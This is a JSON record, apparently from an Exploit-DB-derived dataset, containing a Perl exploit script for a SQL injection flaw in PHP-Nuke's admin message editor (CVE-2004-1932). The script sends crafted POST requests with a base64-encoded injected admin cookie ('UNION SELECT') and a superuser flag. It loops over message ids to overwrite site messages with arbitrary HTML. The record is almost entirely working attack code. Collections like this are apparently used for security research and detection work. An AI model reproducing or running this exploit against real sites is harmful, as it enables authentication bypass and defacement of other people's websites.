{
  "id": "465",
  "title": "PHP-Nuke - SQL Injection Edit/Save Messages",
  "cve": "CVE-2004-1932",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/perl\r\n#\r\n\r\nuse LWP; \r\n\r\n$log = \"pos_komen_phpnuke_savemsg.txt\"; \r\n$Agent = \"Mbahmubangga/1.0\";\r\n$proxy = \"http://172.9.1.11:80/\"; # proxy:port ...\r\n$browser = LWP::UserAgent->new;\r\n$browser -> agent($Agent);\r\n\r\n$url = 'http://www.sitewithphpnuke.com/admin.php';\r\n\r\n$browser->proxy(http => $proxy) if defined($proxy);\r\n\r\nprintlog (\"\\nProcessing: $url\\n\");\r\n\r\nfor ($a = 1; $a < 11 ; $a++) {\r\n\r\n$mid=$a;\r\n\r\n$loginpost = $url;\r\n$loginrequest = HTTP::Request->new(POST => $loginpost);\r\n$loginrequest->content_type('application/x-www-form-urlencoded');\r\n$loginsend = \r\n'title=<h1>JUST TESTING</h1>'.\r\n'&content=you can put HTML format here, all up to you now, 1 liner of course,\r\nor multiple liner with dot'.\r\n'&mlanguage='. #message language\r\n'&expire=0'. #unlimited\r\n'&active=1'. #yes\r\n'&chng_date=0'.\r\n'&view=1'. #all visitors\r\n'&mdate='.\r\n'&mid='.$mid. #the message id, commonly has value under 11\r\n'&admin=eCcgVU5JT04gU0VMRUNUIDEvKjox'. #our magic ammo ==> x'%20UNION%20SELECT%201/*:1\r\n'&add_radminsuper=1'. #the super user / G O D\r\n'&op=savemsg'; #operation\r\n$loginrequest->content-length($loginsend);\r\n$loginrequest->content($loginsend);\r\n$loginresponse = $browser->request($loginrequest);\r\n$logincek = $loginresponse->as_string;\r\n#print ($logincek);\r\n\r\n\r\nif ($logincek =~ /(500 Can\\'t read entity body\\: Unknown error)|(411 Length Required)/){\r\nprintlog (\"$mid attempting edit and saving message sending OK \".$loginresponse-\r\n>status_line .\"\\n\") ;\r\n}\r\nelse {\r\nprintlog (\"Could be failure \".$loginresponse->status_line .\"\\n\");\r\nlast;\r\n}\r\n\r\n} #end of for\r\n\r\nsub printlog {\r\nprint @_[0]; \r\nopen(lo,\">>$log\");\r\nprint lo @_[0];\r\nclose(lo);\r\nreturn;\r\n}\r\n\r\n# milw0rm.com [2004-09-16]",
  "url": "https://www.exploit-db.com/exploits/465"
}